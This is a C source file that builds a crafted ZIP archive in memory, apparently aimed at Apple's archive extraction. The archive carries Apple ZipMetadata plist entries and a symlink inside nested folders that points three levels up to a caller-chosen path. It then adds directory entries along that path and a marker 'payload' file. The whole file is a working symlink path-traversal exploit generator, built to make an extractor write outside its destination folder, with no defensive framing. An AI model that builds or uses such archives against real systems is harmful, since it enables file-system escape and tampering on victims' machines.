#include "XFATCZip.h"
#include <stdlib.h>
#include <string.h>

typedef struct { uint8_t *p; size_t n, cap; int failed; } XFZipBuffer;
static void xf_put(XFZipBuffer *b, const void *p, size_t n) {
    if (b->failed || n > 8u*1024u*1024u || b->n > 8u*1024u*1024u-n) { b->failed=1; return; }
    if (b->n+n>b->cap) {
        size_t cap=b->cap ? b->cap : 4096;
        while (cap<b->n+n) cap*=2;
        void *v=realloc(b->p,cap); if (!v) { b->failed=1; return; }
        b->p=v; b->cap=cap;
    }
    if (n) memcpy(b->p+b->n,p,n);
    b->n+=n;
}
static void xf_u16(XFZipBuffer *b,uint16_t v) { uint8_t a[2]={(uint8_t)v,(uint8_t)(v>>8)}; xf_put(b,a,2); }
static void xf_u32(XFZipBuffer *b,uint32_t v) { uint8_t a[4]={(uint8_t)v,(uint8_t)(v>>8),(uint8_t)(v>>16),(uint8_t)(v>>24)}; xf_put(b,a,4); }
static uint32_t xf_crc(const uint8_t *p,size_t n) {
    uint32_t c=0xffffffffu;
    while(n--) { c^=*p++; for(int i=0;i<8;i++) c=(c>>1)^(0xedb88320u & (0u-(c&1u))); }
    return ~c;
}
static void xf_entry(XFZipBuffer *local,XFZipBuffer *central,const char *name,
                     const uint8_t *data,size_t len,uint32_t mode) {
    size_t nl=strlen(name); uint32_t crc=xf_crc(data,len), off=(uint32_t)local->n;
    if(nl>65535||len>0xffffffffu){local->failed=1;return;}
    /* Match the reference's StreamingZip profile; file types live in SZip extra. */
    xf_u32(local,0x04034b50); xf_u16(local,20); xf_u16(local,0); xf_u16(local,0);
    xf_u16(local,0); xf_u16(local,33); xf_u32(local,crc); xf_u32(local,(uint32_t)len);
    xf_u32(local,(uint32_t)len); xf_u16(local,(uint16_t)nl); xf_u16(local,6);
    xf_put(local,name,nl); xf_u16(local,0x5a53); xf_u16(local,2); xf_u16(local,(uint16_t)mode);
    xf_put(local,data,len);
    xf_u32(central,0x02014b50); xf_u16(central,20); xf_u16(central,20);
    xf_u16(central,0); xf_u16(central,0); xf_u16(central,0); xf_u16(central,33);
    xf_u32(central,crc); xf_u32(central,(uint32_t)len); xf_u32(central,(uint32_t)len);
    xf_u16(central,(uint16_t)nl); xf_u16(central,6); xf_u16(central,0);
    xf_u16(central,0); xf_u16(central,0); xf_u32(central,mode<<16);
    xf_u32(central,off); xf_put(central,name,nl);
    xf_u16(central,0x5a53); xf_u16(central,2); xf_u16(central,(uint16_t)mode);
}
int xf_atc_build_directory_zip(const char *tail,const uint8_t *metadata,size_t ml,
                               uint8_t **out,size_t *out_len) {
    if(!out||!out_len) return -1; *out=NULL; *out_len=0;
    if(!tail||!metadata||ml==0||ml>4096) return -1;
    size_t tl=strlen(tail); if(!tl||tl>2048||tail[0]=='/'||tail[tl-1]=='/'||strchr(tail,'\\'))return -1;
    size_t start=0; unsigned int components=0;
    for(size_t i=0;i<=tl;i++) if(i==tl||tail[i]=='/') {
        size_t n=i-start; if(!n||(n==1&&tail[start]=='.')||(n==2&&tail[start]=='.'&&tail[start+1]=='.'))return -1;
        if(++components>64)return -1; start=i+1;
    }
    XFZipBuffer l={0},c={0}; uint16_t count=0;
    xf_entry(&l,&c,"META-INF/",NULL,0,040755); count++;
    xf_entry(&l,&c,"META-INF/com.apple.ZipMetadata.plist",metadata,ml,0100600); count++;
    const char *dirs[]={"p0/","p0/p1/","p0/p1/p2/"};
    for(int i=0;i<3;i++){xf_entry(&l,&c,dirs[i],NULL,0,040755);count++;}
    char *link=malloc(tl+10),*dir=malloc(tl+2);
    if(!link||!dir){free(link);free(dir);free(l.p);free(c.p);return -2;}
    memcpy(link,"../../../",9); memcpy(link+9,tail,tl+1);
    xf_entry(&l,&c,"p0/p1/p2/link",(const uint8_t*)link,tl+9,0120777);count++;
    for(size_t i=0;i<=tl;i++) if(i==tl||tail[i]=='/') {
        memcpy(dir,tail,i);dir[i]='/';dir[i+1]=0;
        xf_entry(&l,&c,dir,NULL,0,040755);count++;
    }
    const uint8_t marker[]="directory-list";
    xf_entry(&l,&c,"payload",marker,sizeof(marker)-1,0100600);count++;
    free(link);free(dir);
    uint32_t central_off=(uint32_t)l.n,central_len=(uint32_t)c.n;
    xf_put(&l,c.p,c.n);free(c.p);
    xf_u32(&l,0x06054b50);xf_u16(&l,0);xf_u16(&l,0);xf_u16(&l,count);xf_u16(&l,count);
    xf_u32(&l,central_len);xf_u32(&l,central_off);xf_u16(&l,0);
    if(l.failed||c.failed){free(l.p);return -2;}
    *out=l.p;*out_len=l.n;return 0;
}
